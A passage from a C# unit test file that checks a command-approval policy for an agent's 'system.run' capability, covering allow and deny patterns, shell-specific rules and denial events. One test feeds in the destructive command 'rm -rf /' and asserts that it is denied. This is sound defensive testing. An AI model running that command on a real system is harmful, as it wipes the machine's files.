                new ExecApprovalRule { Pattern = "rm *", Action = ExecApprovalAction.Allow },
            }, ExecApprovalAction.Deny);

            var cap = CreateCapability(policy);

            // {"command":"rm","args":["-rf","/"]} — full command "rm -rf /" must be denied
            var dangerousReq = new NodeInvokeRequest
            {
                Command = "system.run",
                Args = JsonDocument.Parse("{\"command\":\"rm\",\"args\":[\"-rf\",\"/\"]}").RootElement
            };
            var denied = await cap.ExecuteAsync(dangerousReq);
            Assert.False(denied.Ok);
            Assert.Contains("denied", denied.Error!, StringComparison.OrdinalIgnoreCase);

            // {"command":"rm","args":["safe.txt"]} — "rm safe.txt" matches "rm *" → allowed
            var safeReq = new NodeInvokeRequest
            {
                Command = "system.run",
                Args = JsonDocument.Parse("{\"command\":\"rm\",\"args\":[\"safe.txt\"]}").RootElement
            };
            var allowed = await cap.ExecuteAsync(safeReq);
            Assert.True(allowed.Ok);
        }
        finally
        {
            // slopwatch-ignore: SW003 Test cleanup or fixture teardown is best-effort and must not hide the test outcome.
            try { Directory.Delete(tempDir, true); } catch { }
        }
    }

    [Fact]
    public async Task SystemRun_ShellFilter_PolicySkipsRuleForWrongShell()
    {
        // A rule with Shells=["pwsh"] must not fire when shell="cmd",
        // ensuring shell-filtered rules are not applied across shell contexts.
        var tempDir = Path.Combine(Path.GetTempPath(), $"test-{Guid.NewGuid():N}");
        Directory.CreateDirectory(tempDir);
        try
        {
            var policy = new ExecApprovalPolicy(tempDir, _logger);
            policy.SetRules(new[]
            {
                // This allow rule only applies to pwsh
                new ExecApprovalRule
                {
                    Pattern = "Get-Process *",
                    Action = ExecApprovalAction.Allow,
                    Shells = new[] { "pwsh" }
                },
            }, ExecApprovalAction.Deny);

            var cap = CreateCapability(policy);

            // shell=pwsh → rule fires → allowed
            var pwshReq = new NodeInvokeRequest
            {
                Command = "system.run",
                Args = JsonDocument.Parse("{\"command\":\"Get-Process explorer\",\"shell\":\"pwsh\"}").RootElement
            };
            var pwshResult = await cap.ExecuteAsync(pwshReq);
            Assert.True(pwshResult.Ok);

            // shell=cmd → rule is skipped → denied by default
            var cmdReq = new NodeInvokeRequest
            {
                Command = "system.run",
                Args = JsonDocument.Parse("{\"command\":\"Get-Process explorer\",\"shell\":\"cmd\"}").RootElement
            };
            var cmdResult = await cap.ExecuteAsync(cmdReq);
            Assert.False(cmdResult.Ok);
            Assert.Contains("denied", cmdResult.Error!, StringComparison.OrdinalIgnoreCase);
        }
        finally
        {
            // slopwatch-ignore: SW003 Test cleanup or fixture teardown is best-effort and must not hide the test outcome.
            try { Directory.Delete(tempDir, true); } catch { }
        }
    }

    [Fact]
    public async Task SystemRun_PolicyAutoDeny_FiresPolicyAutoDecidedEvent()
    {
        // Regression: when policy denies without a prompt (default Deny + no match,
        // or explicit Deny rule), SystemCapability must raise PolicyAutoDecided so
        // chat surfaces a denial card. Without this, user sees silence after
        // approving the gateway-level request.
        var tempDir = Path.Combine(Path.GetTempPath(), $"test-{Guid.NewGuid():N}");
        Directory.CreateDirectory(tempDir);
        try
        {
            var policy = new ExecApprovalPolicy(tempDir, _logger);
            policy.SetRules(new[]
            {
                new ExecApprovalRule { Pattern = "echo *", Action = ExecApprovalAction.Allow },
            }, ExecApprovalAction.Deny);

            var cap = CreateCapability(policy);

            ExecApprovalPromptDecidedEventArgs? captured = null;
            cap.PolicyAutoDecided += (_, args) => captured = args;

            var request = new NodeInvokeRequest
            {
                Command = "system.run",
                Args = JsonDocument.Parse("{\"command\":\"tasklist\"}").RootElement
            };
            var result = await cap.ExecuteAsync(request);

            Assert.False(result.Ok);
            Assert.NotNull(captured);
            Assert.Equal(ExecApprovalPromptDecisionSource.PolicyAutoDeny, captured!.Source);
            Assert.Equal("tasklist", captured.Request.Command);
            Assert.Equal(ExecApprovalPromptDecisionKind.Deny, captured.Decision.Kind);
        }
        finally
        {
            try { Directory.Delete(tempDir, true); } catch { }
        }
    }

    [Fact]
    public async Task SystemRun_PromptApproved_DoesNotFirePolicyAutoDecidedEvent()
    {
        // Sanity: when the policy action is Prompt and a handler exists, we go down
        // the prompt path. PolicyAutoDecided must NOT fire — the prompt service's
        // own Decided event covers that case.
        var tempDir = Path.Combine(Path.GetTempPath(), $"test-{Guid.NewGuid():N}");
        Directory.CreateDirectory(tempDir);
        try
        {
            var policy = new ExecApprovalPolicy(tempDir, _logger);
            policy.SetRules(System.Array.Empty<ExecApprovalRule>(), ExecApprovalAction.Prompt);

            var cap = CreateCapability(policy);
            cap.SetPromptHandler(new AllowOncePromptHandler());

            var fired = false;
            cap.PolicyAutoDecided += (_, _) => fired = true;

            var request = new NodeInvokeRequest
            {
                Command = "system.run",
                Args = JsonDocument.Parse("{\"command\":\"tasklist\"}").RootElement
            };
            var result = await cap.ExecuteAsync(request);

            Assert.True(result.Ok);
            Assert.False(fired, "PolicyAutoDecided should not fire when a prompt handles the decision");
        }
        finally
        {
            try { Directory.Delete(tempDir, true); } catch { }
        }
    }
}

internal class AllowOncePromptHandler : IExecApprovalPromptHandler
{
    public Task<ExecApprovalPromptDecision> RequestAsync(
        ExecApprovalPromptRequest request,
        System.Threading.CancellationToken cancellationToken = default)
        => Task.FromResult(ExecApprovalPromptDecision.AllowOnce());
}

/// <summary>Mock command runner that always succeeds</summary>
internal class MockCommandRunner : ICommandRunner
{
    public string Name => "mock";
    
    public Task<CommandResult> RunAsync(CommandRequest request, System.Threading.CancellationToken ct = default)
    {
        return Task.FromResult(new CommandResult
        {
            Stdout = $"mock: {request.Command}",
            Stderr = "",
            ExitCode = 0,
            DurationMs = 1
        });
    }
}

/// <summary>Simple test logger for exec tests</summary>
internal class ExecTestLogger : IOpenClawLogger
{
    public void Info(string message) { }
    public void Debug(string message) { }
    public void Warn(string message) { }
    public void Error(string message) { }
    public void Error(string message, Exception? ex = null) { }
}
